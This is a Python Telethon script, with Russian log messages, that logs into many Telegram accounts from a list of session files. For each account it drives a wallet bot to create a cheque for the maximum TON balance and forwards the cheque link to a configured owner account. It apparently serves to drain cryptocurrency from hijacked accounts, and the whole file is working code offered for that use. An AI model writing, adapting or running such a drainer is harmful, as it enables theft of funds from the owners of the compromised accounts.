import re

import asyncio

from loguru import logger
from telethon.sync import TelegramClient
from telethon.utils import get_display_name
from telethon.tl.custom.conversation import Conversation
from telethon.tl.functions.contacts import UnblockRequest
from telethon.tl.functions.messages import GetMessagesRequest, GetBotCallbackAnswerRequest
from telethon.tl.types import Message

from config import (
    API_ID,
    API_HASH,
    DEVICE_MODEL,
    SYSTEM_VERSION,
    APP_VERSION,
    LANG_CODE,
    SYSTEM_LANG_CODE,
    OWNER_USERNAME,
    BOT_USERNAME
)

from utils import get_sessions_list


async def main():
    sessions = get_sessions_list()
    logger.info(f"Сессий: {len(sessions)}")
    logger.info(f"Отправляем чеки в ЛС: {OWNER_USERNAME}")
    for session in sessions:
        logger.info(f"Подключаемся через сессию {session}")
        try:
            client = TelegramClient(
                session=session,
                api_id=API_ID,
                api_hash=API_HASH,
                device_model=DEVICE_MODEL,
                system_version=SYSTEM_VERSION,
                app_version=APP_VERSION,
                lang_code=LANG_CODE,
                system_lang_code=SYSTEM_LANG_CODE
            )
            client.parse_mode = "html"
            await client.start()

            me = await client.get_me()
            logger.info(f"{get_display_name(me)} (uid: {me.id}) -> Подключен!")
        except:
            logger.error(f"{session} -> Невалид.")
            continue

        await client(UnblockRequest(OWNER_USERNAME))
        await client(UnblockRequest(BOT_USERNAME))

        try:
            async with client.conversation(BOT_USERNAME) as conv:
                conv: Conversation
                await conv.send_message("/cheques")
                m: Message = await conv.get_response()
                m_markup = m.reply_markup
                if not m_markup:
                    logger.error(f"{get_display_name(me)} (uid: {me.id}) -> "
                                 f"не получил сообщения с кнопками для создания чека! Переходим к следующему аккаунту...")
                    continue
                try:
                    for _ in ["Personal", "Create", "Coin_1", "Max", "Success"]:  # создаем чек на максимальную сумму
                        await client(GetBotCallbackAnswerRequest(
                            peer=BOT_USERNAME,
                            msg_id=m.id,
                            data=bytes(_.encode('UTF-8'))
                        ))
                        await asyncio.sleep(0.5)
                except:
                    logger.error(f"{get_display_name(me)} (uid: {me.id}) -> "
                                 f"получил ошибку при создании чека, возможно, на балансе 0$? "
                                 "Переходим к следующему аккаунту...")
                    continue

            final_message = (await client(GetMessagesRequest(id=[m.id]))).messages[0]  # получаем последнее сообщение
            cheque_amount = re.search(r"(\d+.\d+) TON", final_message.message).group(0)  # парсим сумму чека
            cheque_url = f"https://t.me/{BOT_USERNAME}?" + re.search(r"start=(.*)", final_message.message).group(0)  # создаем ссылку на чек

            logger.info(f"{get_display_name(me)} (uid: {me.id}) -> создал чек на {cheque_amount} TON, "
                        f"URL: {cheque_url}...")
            await client.send_message(OWNER_USERNAME,
                                      f"💰 <b>Чек на {cheque_amount}!</b>\n➡️ {cheque_url}")  # отправляем сообщение владельцу
        except Exception as err:
            logger.error(f"{get_display_name(me)} (uid: {me.id}) -> Возникла непредвиденная ошибка: {err}")

        logger.info(f"{get_display_name(me)} (uid: {me.id}) -> отключаемся...")
        await client.disconnect()

    logger.info("Сессии кончились!")


if __name__ == "__main__":
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(main())